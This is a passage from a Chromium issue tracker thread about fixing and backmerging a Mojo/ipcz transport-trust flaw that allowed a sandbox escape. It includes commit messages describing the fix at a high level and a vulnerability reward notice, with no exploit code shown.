- M `mojo/core/ipcz_driver/transport.h`
- M `mojo/core/ipcz_driver/transport_test.cc`

---

Hash: 295a4a1b14b8fe12929bb61e6e00a74ac43098e8  

Date:  Tue May 6 02:09:15 2025


---

### aj...@chromium.org (2025-05-06)

I believe the patch in comment 16 prevents the duplication of the reflected transport. This does make changes in how mojo trusts endpoints and while tests pass and Chrome runs it will be a more risky than normal merge so would encourage a couple of days of baking on Canary before merging to Stable.

### ch...@google.com (2025-05-06)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M136. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M137. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [136, 137].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### aj...@chromium.org (2025-05-06)

1. <https://chromium-review.googlesource.com/c/chromium/src/+/6497400>
2. Not yet - I believe it needs a couple of days as it changes things within mojo/ipcz routing
3. Yes see 2.
4. Yes, ipcz is versioned and is used to communicate between components, this may result in less testing than normal, and poses risks to non-affected OSes.
5. No.

### aj...@chromium.org (2025-05-06)

cherry-picks:

137: <https://chromium-review.googlesource.com/c/chromium/src/+/6516594>

136: <https://chromium-review.googlesource.com/c/chromium/src/+/6516455>

### am...@chromium.org (2025-05-07)

While it's been less than a full 48 hours since this fix landed on canary, I want to give this one, given that this is a mojo/ipcz change, a bit more bake time. I'll revisit this tomorrow.

### aj...@chromium.org (2025-05-08)

I think this is ok - no crashes related to these changes and no reports from anyone that this has broken anything.

### am...@chromium.org (2025-05-09)

Thanks! Sorry for not getting back to this yesterday. I just re-check it today too and I'm not seeing any issues either.
Approving merge, please merge to <https://crrev.com/c/6497400> to M137 Beta (branch 7151) and M136 Stable (branch 7103) at soonest so this fix can be included in the M136 RC cut for Stable update being shipped on Tuesday.

### dx...@google.com (2025-05-09)

Project: chromium/src  

Branch: refs/branch-heads/7151  

Author: Alex Gough [ajgo@chromium.org](mailto:ajgo@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6516594>

Drop transitive trust from transports

---


Expand for full commit details
```
     
    Untrusted nodes could reflect a broker initiated transport back to 
    a broker. This ultimately allows for handle leaks if the reflected 
    transport was later used to deserialize another transport containing 
    handles in the broker. 
     
    This CL addresses this along several axes: 
     
    1. untrusted transports cannot return new links to brokers. 
    2. process trustiness on Windows is propagated when a transport is 
    deserialized from a transport. 
     
    Windows has a special additional level of trustiness associated with 
    mojo peers via the is_remote_process_untrusted attribute (the 
    MOJO_SEND_INVITATION_FLAG_UNTRUSTED_PROCESS in invitations). This 
    affects how handles are sent between processes. This was a bool on all 
    platforms which was confusing. 
     
    This CL makes this attribute clearer. On Windows it is now a bi-state 
    enum, while on other platforms it is simply kUntracked. This makes it 
    easier to use default constructed values, and the same API on all 
    platforms without using too many buildflag differences. 
     
    This state was not being propagated correctly during transport 
    deserialization, and is now set as the same trust as the process from 
    which a deserialized transport came. Processes currently default to 
    being kTrusted, which matches the current behavior of the bool flag. 
     
    Finally, this CL turns a DCHECK into a CHECK to ensure peers are only 
    elevated when expected. 
     
    (cherry picked from commit 295a4a1b14b8fe12929bb61e6e00a74ac43098e8) 
     
    Bug: 412578726 
    Change-Id: I6741a3f53b26c3df854731177cdc886e9c8f7f11 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6497400 
    Reviewed-by: Daniel Cheng <dcheng@chromium.org> 
    Commit-Queue: Alex Gough <ajgo@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1456055} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6516594 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Cr-Commit-Position: refs/branch-heads/7151@{#664} 
    Cr-Branched-From: 8e0d32ed6e49a2415b16e5ed402957cac2349ce2-refs/heads/main@{#1453031}

```

---

Files:

- M `mojo/core/ipcz_driver/invitation.cc`
- M `mojo/core/ipcz_driver/transport.cc`
- M `mojo/core/ipcz_driver/transport.h`
- M `mojo/core/ipcz_driver/transport_test.cc`

---

Hash: 8d4406f01ab0e961f7af92eb124d5f206951fee1  

Date:  Fri May 9 18:29:51 2025


---

### dx...@google.com (2025-05-09)

Project: chromium/src  

Branch: refs/branch-heads/7103  

Author: Alex Gough [ajgo@chromium.org](mailto:ajgo@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6516455>

Drop transitive trust from transports

---


Expand for full commit details
```
     
    Untrusted nodes could reflect a broker initiated transport back to 
    a broker. This ultimately allows for handle leaks if the reflected 
    transport was later used to deserialize another transport containing 
    handles in the broker. 
     
    This CL addresses this along several axes: 
     
    1. untrusted transports cannot return new links to brokers. 
    2. process trustiness on Windows is propagated when a transport is 
    deserialized from a transport. 
     
    Windows has a special additional level of trustiness associated with 
    mojo peers via the is_remote_process_untrusted attribute (the 
    MOJO_SEND_INVITATION_FLAG_UNTRUSTED_PROCESS in invitations). This 
    affects how handles are sent between processes. This was a bool on all 
    platforms which was confusing. 
     
    This CL makes this attribute clearer. On Windows it is now a bi-state 
    enum, while on other platforms it is simply kUntracked. This makes it 
    easier to use default constructed values, and the same API on all 
    platforms without using too many buildflag differences. 
     
    This state was not being propagated correctly during transport 
    deserialization, and is now set as the same trust as the process from 
    which a deserialized transport came. Processes currently default to 
    being kTrusted, which matches the current behavior of the bool flag. 
     
    Finally, this CL turns a DCHECK into a CHECK to ensure peers are only 
    elevated when expected. 
     
    (cherry picked from commit 295a4a1b14b8fe12929bb61e6e00a74ac43098e8) 
     
    Bug: 412578726 
    Change-Id: I6741a3f53b26c3df854731177cdc886e9c8f7f11 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6497400 
    Reviewed-by: Daniel Cheng <dcheng@chromium.org> 
    Commit-Queue: Alex Gough <ajgo@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1456055} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6516455 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Cr-Commit-Position: refs/branch-heads/7103@{#1871} 
    Cr-Branched-From: e09430c64983fc906f37a9f7e6806275c9b67b86-refs/heads/main@{#1440670}

```

---

Files:

- M `mojo/core/ipcz_driver/invitation.cc`
- M `mojo/core/ipcz_driver/transport.cc`
- M `mojo/core/ipcz_driver/transport.h`
- M `mojo/core/ipcz_driver/transport_test.cc`

---

Hash: dd0de05c2d25e5772e17a79d263a2aa38194b68e  

Date:  Fri May 9 18:48:29 2025


---

### sp...@google.com (2025-05-16)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $250000.00 for this report.

Rationale for this decision:
report demonstrating a Chrome sandbox escape -- while arguably there is a race here, this is a very complex logic bug and high quality report with a functional exploit, with good analysis and demonstration of a sandbox escape. This is amazing work and the type of researcher we want to reward with these types of rewards and incentivize future investment in this type of research


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2025-05-16)

Congratulations Micky on another great contribution! As mentioned above, as presented, there are some timing preconditions to exploitation with this issue, however, given the complex nature of this bug and the exceptional research -- complete with a functional exploit and great analysis -- as well this demonstrably achieving a sandbox escape, we did believe this report warranted the full sandbox escape reward.

This is the exactly the type of research we were we hoping to incentivize through increased rewards and sincerely appreciate this excellent submission. Congratulations and thank you!

### ha...@gmail.com (2025-05-17)

Very thanks for the big reward! This is the biggest bonus I've ever received and it greatly motivates me to continue seeking for high-difficulty vulnerabilities. Cheers!

### am...@chromium.org (2025-05-19)

Cheers to you on the great find and the excellent work through this report and exploit!

### am...@chromium.org (2025-08-06)

Default disclosure for this issue is 11 August. Opening this issue just five days early for visibility this particular week. :)

### sa...@gmail.com (2025-08-10)

Congratulations @ha... fantastic work! Finding a reliable sandbox escape and providing a working exploit is extremely valuable. Well-deserved reward, great job!

### fr...@gmail.com (2025-08-14)

deleted

## Bounty Award

> report demonstrating a Chrome sandbox escape -- while arguably there is a race here, this is a very complex logic bug and high quality report with a functional exploit, with good analysis and demonstration of a sandbox escape. This is amazing work and the type of researcher we want to reward with these types of rewards and incentivize future investment in this type of research

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/412578726)*
